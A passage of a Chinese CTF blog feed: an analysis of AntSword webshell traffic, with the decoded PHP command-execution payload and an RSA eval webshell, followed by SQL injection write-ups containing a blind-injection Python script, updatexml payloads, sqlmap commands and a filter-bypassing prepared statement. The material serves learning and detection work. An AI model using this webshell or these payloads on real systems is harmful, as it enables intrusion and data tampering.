(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> False;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">                <span class="keyword">return</span> True;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span>=<span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;&quot;</span>,<span class="variable">$o</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$fp</span>=@<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;proc_open&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$p</span> = @<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">            @<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">            @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">runshellshock</span>(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @<span class="title function_ invoke__">class_exists</span>(<span class="string">&quot;COM&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">            <span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">            <span class="variable">$se</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdErr</span>();</span><br><span class="line">            <span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$ret</span>=@<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">&amp;g51c7aeb92ccb2=<span class="number">6</span>nY2QgIi92YXIvd3d3L2h0bWwiO3dob2FtaTtlY2hvIDA5NzRiO3B3ZDtlY2hvIDMyODU1NzkzYmI1Zg==&amp;h78f2db56e81bf=Ay&amp;qf039f1d9cd528=<span class="number">4</span>gL2Jpbi9zaA==</span><br><span class="line"><span class="comment">//ps：单独隔开的这一段我不知道是啥东西</span></span><br></pre></td></tr></table></figure><span class="blur">又长又臭的一段代码</span><h2><span id="分析源码"> 分析源码</span></h2><ul><li><p>开头：朴实无华的post（连接的密码）</p></li><li><p>存在有以下的特征：</p></li><li><p>以<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;); @set_time_limit(0);</code>开头，由于蚁剑是明文传输，所以很容易被发现</p></li><li><p>后面有base64字符</p></li><li><p>以及数据包内存在base64加密的分段内容，经过解码后可以看到路径 命令 以及随机数（后面会看见）</p></li><li><p>使用eval执行</p></li><li><p>注：旧版蚁剑还有的特征在user-agent处，请求头是antsword xxx，但是在新版的蚁剑中此特征已被移除。UA头已经改为默认ua头了（下图为旧版蚁剑的UA头）</p></li></ul><img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/2.png" class title="旧版蚁剑"><p>可以看见function占大部分，而且发送指令时，代码和指令是一块发送的（例如发送了其他post的指令）</p><p>就像下面的post指令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;qf039f1d9cd528&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;g51c7aeb92ccb2&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$envstr</span>=@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;h78f2db56e81bf&quot;</span>],<span class="number">2</span>));</span><br></pre></td></tr></table></figure><p>使用wireshark可以看到传参的值</p><img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/3.png" class title="奇怪的POST"><p>将传参的值使用base64解码（注意，从第三位开始才能正常解码），解码结果如下</p><img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/4.png" class title="解码值"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bin/sh</span><br><span class="line">cd <span class="string">&quot;/var/www/html&quot;</span>;cd /<span class="keyword">var</span>/www/html/;<span class="keyword">echo</span> d6fdb533a5e5;pwd;<span class="keyword">echo</span> <span class="number">230</span>ef1f</span><br><span class="line">第一个cd：文件路径</span><br><span class="line">第二个cd：输入的指令，前文中已有叙述</span><br><span class="line"><span class="keyword">echo</span>:应该是返回的随机数</span><br><span class="line">pwd：在linux命令中是查看当前路径</span><br></pre></td></tr></table></figure><p>基本上只有简单的加密</p><h2><span id="base64加密"> Base64加密</span></h2><p>在编码器中选择base64加密</p><p>wireshark抓包后的结果如下</p><img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/6.png" class title="Base64加密"><p>可以看到明显的base64 eval函数</p><p><code>Value: @eval(@base64_decode($_POST['c540d73cacbdc8']));</code></p><p>经过base64解密，可以看到如下图所示的结果</p><img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/7.png" class title="base64解密"><p>可以看得出来，和明文是一样的</p><h2><span id="chr加密"> chr()加密</span></h2><p>结果大同小异</p><img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/8.png" class title="chr编码"><p>同样解码后还是经典的<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</code></p><h2><span id="rsa加密"> RSA加密</span></h2><p>在蚁剑的编码器管理中生成RSA密钥</p><img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/5.png" class title="RSA加密"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>];</span><br><span class="line"><span class="variable">$pk</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDjSec5p39mmIrvHqeve/mdoE8C</span></span><br><span class="line"><span class="string">NplDHfLvBRv9SAhSMFJtf636Z7MljxuN4tu7JNouqJRzQHpvPFPxRoNQqvUPvNS/</span></span><br><span class="line"><span class="string">+WYSPkrP4dFFCwmR6UP1Qq7oa1K/w/v7oCTKODVJMdKmXfumpupvV1AGIWW9Tn4K</span></span><br><span class="line"><span class="string">1VLzWRjeUHAHMaxgdwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$cmds</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$pk</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>传上去的流量包是这样的，毫无规律</p><img src="/2022/11/10/%E7%9C%8B%E7%9C%8B%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%8C%85/9.png" class title="RSA"><hr><p>大概就是这样了</p><p>写的很水，也不会做Orz</p><hr><p>参考资料：</p><ul><li><a href="https://blog.csdn.net/single_g_l/article/details/126164475?ops_request_misc=%7B%22request%5Fid%22%3A%22166808798716800184128895%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=166808798716800184128895&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-126164475-null-null.142%5Ev63%5Epc_rank_34_queryrelevant25,201%5Ev3%5Econtrol_2,213%5Ev2%5Et3_esquery_v1&amp;utm_term=%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81&amp;spm=1018.2226.3001.4187"> 菜刀、蚁剑、冰蝎、哥斯拉特征码</a></li><li><a href="http://t.csdn.cn/EJrky">蚁剑流量分析</a></li></ul><p>大佬轻喷qwq</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天来看看Misc（雾）&lt;/p&gt;
&lt;p&gt;只是简单的看一下蚁剑上传的包被wireshark抓包以后的形式&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Misc" scheme="http://example.com/categories/CTF-Misc/"/>
    
    
    <category term="POST" scheme="http://example.com/tags/POST/"/>
    
    <category term="Misc" scheme="http://example.com/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Buuoj Hack World 题解</title>
    <link href="http://example.com/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/</id>
    <published>2022-11-09T05:08:46.000Z</published>
    <updated>2023-03-12T09:43:56.833Z</updated>
    
    <content type="html"><![CDATA[<p>续接上文</p><span id="more"></span><h2><span id="打开靶机"> 打开靶机</span></h2><p>同样是sql注入，题面已经提示我们flag在flag表的flag列里了</p><p>接下来我们只需要查询就好了</p><h2><span id="检测注入方式"> 检测注入方式</span></h2><p>输入1’ 回显bool(false)</p><p>没有报错信息</p><p>使用堆叠注入和联合查询 均回显SQL Injection Checked.</p><img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/1.png" class title="被过滤"><p>那只能考虑盲注，测试下是否有两种回显方式</p><p>使用<code>1^1</code> 和<code>1^0</code> 测试</p><p>发现1^1时，回显Error</p><p>发现1^0时，回显Hello, glzjin wants a girlfriend.</p><p>说明可以使用盲注</p><img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/2.png" class title="盲注测试"><img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/3.png" class title="盲注测试"><p>直接跑脚本就行了</p><p>把昨天的脚本复制一下，post传参名称改为id就好了（题目提示要我们提供id）</p><h2><span id="payload"> Payload</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> times</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span> : <span class="string">&quot;1^(ascii(substr((select(group_concat(flag))from(flag)),%d,1))&lt;%d)&quot;</span>%(i,mid)</span><br><span class="line">        &#125;</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res +=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br></pre></td></tr></table></figure><p>但是这里跑是跑不出结果的</p><h3><span id="问题分析"> 问题分析</span></h3><p>测试语句</p><p><code>1^(ascii(substr((select(group_concat(flag))from(flag)),1,1))&lt;104)</code> (因为flag的第一个字母f的ascii是102)</p><p>发现SQL Injection Checked</p><p>所以说某些词被检测到了</p><p>经测试…</p><p>当输入<code>select(group_concat(flag))</code>时，检测到了SQL注入</p><h3><span id="修改payload"> 修改Payload</span></h3><p><strong>如果列内只有一个数据，可以不使用group_concat</strong></p><p><strong>因为flag列只有一个flag（</strong></p><p>所以脚本payload改为</p><p><code>1^(ascii(substr((select(flag)from(flag)),%d,1))&lt;%d)%(i,mid)</code></p><p>成功拿到flag</p><img src="/2022/11/09/Buuoj-Hack-World-%E9%A2%98%E8%A7%A3/4.png" class title="结束"><p>PS：<s>不要直接copy我的flag，这个题是动态flag</s></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;续接上文&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web WriteUp" scheme="http://example.com/categories/CTF-Web-WriteUp/"/>
    
    
    <category term="SQL_Injection" scheme="http://example.com/tags/SQL-Injection/"/>
    
    <category term="POST" scheme="http://example.com/tags/POST/"/>
    
  </entry>
  
  <entry>
    <title>NewStarCTF SQL注入题</title>
    <link href="http://example.com/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/"/>
    <id>http://example.com/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/</id>
    <published>2022-11-08T07:24:09.000Z</published>
    <updated>2023-03-12T09:43:56.842Z</updated>
    
    <content type="html"><![CDATA[<p>摆烂大师的第一篇Web文章，qwq。检验我摆烂的水平的时间到了</p><p>写写NewStarCTF的SQL注入题吧… 五周考了五个注入，考的点都不一样</p><span id="more"></span><h1><span id="newstarctf-week-1-word-for-you"> NewStarCTF Week 1： Word - For - You</span></h1><p>嗯… 这个题其实并不算sql注入，只是让你熟悉SQL的语句罢了</p><h2><span id="打开靶机"> 打开靶机</span></h2><p>查询语句发现，输入1和输入1’的回显是一致的，根据这个信息能够初步得出考的应该不是SQL注入</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/1.png" class title="输入1时的回显"><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/2.png" class title="输入1" alt="时的回显"><h2><span id="sql万能密码"> SQL万能密码</span></h2><p>一般查询数据库执行的语句时 <code>select user_id,user_type,email from users where user_id='用户名' and password='密码'</code></p><p>由于后台进行数据库查询时没有滤过单引号，当输入admin 和 1’ or’1’='1时，执行的语句为：</p><p><code>select user_id,user_type,email from users where user_id='admin' and password='1' or'1'='1'</code></p><p>这样子看的话，SQL查询语句被分成了两段：</p><p>第一段：<code>select user_id,user_type,email from users where user_id='admin' and password='1'</code>   （由于sql语句中逻辑优先度 【=】&gt;【and】&gt;【or】）</p><p>第二段：<code>'1'='1'</code></p><p>这两段语句之间的逻辑运算符是or</p><p>由于1=1恒为真，所以这段SQL语句恒为真，认证成功</p><h2><span id="payload"> payload</span></h2><p>使用SQL注入万能密码查询</p><p><code>1' or'1'='1</code></p><p>拿到flag</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/3.png" class title="拿到flag"><h1><span id="newstarctf-week-2-word-for-you-2-gen"> NewStarCTF Week 2： Word - For - You (2 Gen)</span></h1><p>报错注入 / sqlmap一把梭</p><h2><span id="打开靶机"> 打开靶机</span></h2><p>输入1’ 发现报错，存在SQL注入</p><h2><span id="测试联合注入"> 测试联合注入</span></h2><h3><span id="测试字段"> 测试字段</span></h3><p>输入<code>1' order by 3#</code> 报错</p><p>而输入<code>1' order by 2#</code> 回显正常，说明字段数为2</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/4.png" class title="测试字段3，报错"><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/5.png" class title="测试字段2，正常"><h3><span id="测试回显位"> 测试回显位</span></h3><p>输入<code>1' union select 1,2#</code> 只显示查询成功，说明没有回显位</p><p>无法使用联合注入查询</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/6.png" class title="无回显位"><h2><span id="使用报错注入"> 使用报错注入</span></h2><p>报错注入适用条件：页面没有回显位，但是页面会有报错信息，例如输入 <code>1' order by 3#</code>的时候</p><p>注入语句：<code>updatexml(1,'~',3)</code>，当第二个语句包含特殊字符时，数据库会报错，并且会把参数的内容显示在报错中</p><p>需要使用concat语句拼接字符串，长串的语句使用group_concat</p><p>查询命令：</p><p><code>1' and updatexml(1,concat('~',database()),3)#</code>  --爆库</p><p>爆出库名wfy</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/7.png" class title="报错注入爆库"><p><code>1' and updatexml(1,concat('~',(select group_concat(table_name) from inforamtion_schema.tables where table_schema=database())),3)#</code>--爆表</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/8.png" class title="报错注入爆表"><p><code>1' and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name='wfy_comments')),3)#</code>--爆列名</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/9.png" class title="报错注入爆列名"><p>爆出的列名为id,text,user,name,display</p><p>我们只需要查询text的内容即可</p><h2><span id="payload"> payload</span></h2><p><code>1' and updatexml(1,concat('~',(select(reverse(group_concat(text))) from wfy_comments)),3)#</code></p><p>要点：</p><ul><li>报错注入的查询内容的字符是有限制的，如果内容过多，则无法回显。所以我们这里使用reverse()将flag倒着输出</li><li>使用select之前都需要在select前加括号</li></ul><p>拿到倒置的flag</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/10.png" class title="获取flag"><h2><span id="sqlmap一把梭"> sqlmap一把梭</span></h2><p>sqlmap的使用教程可以查看这篇博客文章</p><p>&lt;[(9条消息) <a href="https://blog.csdn.net/m0_46363249/article/details/119975790?ops_request_misc=%7B%22request_id%22%3A%22166438065816782412550364%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=166438065816782412550364&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-119975790-null-null.142%5Ev50%5Epc_rank_34_1,201%5Ev3%5Econtrol_2&amp;utm_term=sqlmap&amp;spm=1018.2226.3001.4187">工具使用]SqlMap_拈花倾城的博客-CSDN博客_sqlmap联动msf</a>/&gt;</p><p>我们可以使用burp抓包的方式，抓到包的数据存入txt文本内，并使用sqlmap梭哈</p><p>将抓包的数据保存至txt文本内</p><p><code>sqlmap -r 1.txt --dbs</code></p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/11.png" class title="sqlmap:爆库"><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/12.png" class title="sqlmap:爆库成功"><p><code>sqlmap -r 1.txt -D wfy --dump</code></p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/13.png" class title="sqlmap:拿到flag"><p>爆库内容</p><h1><span id="newstarctf-week-3-multisql"> NewStarCTF Week 3： multiSQL</span></h1><p>堆叠注入，sql预处理语句</p><p>题目描述：需要我们修改火华老师的成绩，让他通过四级考试</p><h3><span id="测试联合注入-报错注入"> 测试联合注入 / 报错注入</span></h3><p>输入<code>1' 1</code>均无回显</p><p>输入<code>1' union select 1,2,3,4</code># 发现被过滤</p><p>联合注入失败</p><p>由于无报错信息，无法使用报错注入</p><h3><span id="堆叠注入"> 堆叠注入</span></h3><p>堆叠注入是将多个sql语句一起执行，使用;间隔的注入方式</p><p>输入<code>1';show databases;#</code> 爆库</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/14.png" class title="堆叠注入，爆库"><p>输入<code>1';show tables;#</code>  爆表</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/15.png" class title="堆叠注入，爆表"><p>输入<code>1';show columns from score;#</code> 爆列名</p><img src="/2022/11/08/NewStarCTF-SQL%E6%B3%A8%E5%85%A5%E9%A2%98/16.png" class title="堆叠注入，爆列名"><h3><span id="修改数据"> 修改数据</span></h3><p>使用update语句修改分数即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update`score` set listen=9999 where username=&quot;火华&quot;</span><br></pre></td></tr></table></figure><p>发现被过滤，怀疑过滤update</p><p>所以这里需要我们使用sql预处理语句进行拼接，绕过update的过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;u&#x27;,&#x27;pdate `score` set listen=99999 where username=&quot;火华&quot;&#x27;);prepare sql_exe from @sql;execute 